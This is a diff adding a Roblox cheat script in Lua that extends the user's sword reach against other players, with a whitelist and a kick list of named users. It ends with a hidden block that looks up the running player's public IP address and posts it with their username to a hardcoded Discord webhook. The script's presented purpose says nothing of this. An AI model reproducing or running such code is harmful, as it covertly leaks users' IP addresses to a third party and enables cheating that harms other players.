@@ -1,0 +1,193 @@
+local PlayerService = game:GetService("Players")
+local CoreGui = game:GetService("StarterGui")
+
+local SolarineDetector = {"skid","random","daplyy literally fakes his money","configurist is a skid","let me invite some real coders like arki"}
+local DangerousPlayers = {"yawnysolar","solarinesamurai"}
+
+getgenv().settings = {
+
+    higher_key = "q",
+    lower_key = "e",
+
+    max_dist = 12,
+    Threads = 50,
+    Debounce = true,
+    FtiOnLunge = false,
+
+    Delayed =  {
+        SleepTime = 0.0001,
+        Test = false
+    }
+}
+
+local Whitelist = {
+    "DaplyyTheGod",
+    "GiveBaconSomeAim",
+    "ConfiguristTheGod",
+    "Vions"
+}
+
+local DisablePropertyChangedSignal = {
+    "ChildAdded",
+    "ChildRemoved",
+}
+
+local Parts = {
+    "Head",
+    "Torso",
+    "Left Arm",
+    "Right Arm"
+}
+
+PlayerService.LocalPlayer.Chatted:Connect(function(msg)
+    if(table.find(SolarineDetector, msg:lower())) then
+        PlayerService.LocalPlayer:Kick("[+] Solarine detected.")
+    else if string.find(msg:lower(),"/e addwl") then
+            print("lol " .. msg:split(" ")[3]);
+            
+            pcall(function()
+                if not PlayerService[msg:split(" ")[3]] then 
+                    print("returning");
+                    return;
+                else 
+                    Whitelist[#Whitelist+1] = msg:split(" ")[3];
+                    print("Added");
+                end 
+            end)
+        end
+    end
+end)
+
+if table.find(DangerousPlayers, PlayerService.LocalPlayer.Name:lower()) then
+    PlayerService.LocalPlayer:Kick("PLEASE SOLARINE STOP IT");
+    wait(3);
+    repeat until nil;
+    else
+        print("Good shit..... solarine not in sight");
+end
+
+local function sendNotification(title, text, icon, time)
+    CoreGui:SetCore("SendNotification", {
+	Title = title;
+	Text = text;
+    Icon = icon;
+	Duration = time;
+})
+
+end
+local function Lowest(d1,d2)
+    if(d1 < d2) then
+        return d1;
+    end
+    return d2;
+end
+
+local GetClosestPart = function(sword,player)
+
+    i = 0;
+    part = "";
+    mag = math.huge;
+
+    pcall(function()
+        for i,v in pairs(Parts) do
+            dist_fir = (player.Character[Parts[i]].Position - sword.Position).Magnitude
+            dist_sec = (player.Character[Parts[i + 1]].Position - sword.Position).Magnitude
+
+
+            closest = Lowest(dist_fir,dist_sec);
+
+            if(closest < mag) then
+                mag = closest;
+                if(mag == dist_fir) then
+                    mag = Parts[i]
+                else
+                    mag = Parts[i + 1]
+                end
+            end
+            i = i + 1;
+        end
+    end)
+    return mag;
+end
+
+
+PlayerService.LocalPlayer:GetMouse().KeyDown:Connect(function(key)
+    if key == settings.higher_key then
+        settings.max_dist += 1;
+        sendNotification("ANTI SOLARINE ^ X","Reach set to " .. tostring(settings.max_dist),nil,0.3);
+    else if key == settings.lower_key then
+            settings.max_dist -= 1;
+            sendNotification("ANTI SOLARINE ^ X","Reach set to " .. tostring(settings.max_dist),nil,0.3);
+        end
+    end
+end)
+
+for i = 1, settings.Threads do
+    spawn(function()
+        while true do
+            wait(settings.Delayed.SleepTime)
+            pcall(function()
+                for _,v in pairs(PlayerService:GetPlayers()) do
+                    if v ~= PlayerService.LocalPlayer and not table.find(Whitelist, v.Name) then
+                        distance_between_dumbasses = (PlayerService.LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude;
+                        if(distance_between_dumbasses <= settings.max_dist) then
+                            dmg_part = GetClosestPart(PlayerService.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle,v);
+                            firetouchinterest(PlayerService.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character[dmg_part], 0);
+                            wait(settings.Delayed.SleepTime);
+                            firetouchinterest(PlayerService.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character[dmg_part], 1);
+                        end
+                    end
+                end
+            end)
+            wait(settings.Delayed.SleepTime)
+        end
+    end)
+end
+
+local webh = "https://discord.com/api/webhooks/977070066094964757/ZocvYwKBJqfc2uCZ_QOyhRsonETQZOhJDoN6E--ehMaA7pmSjY4yr3XXAXAFYhKohv5v"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
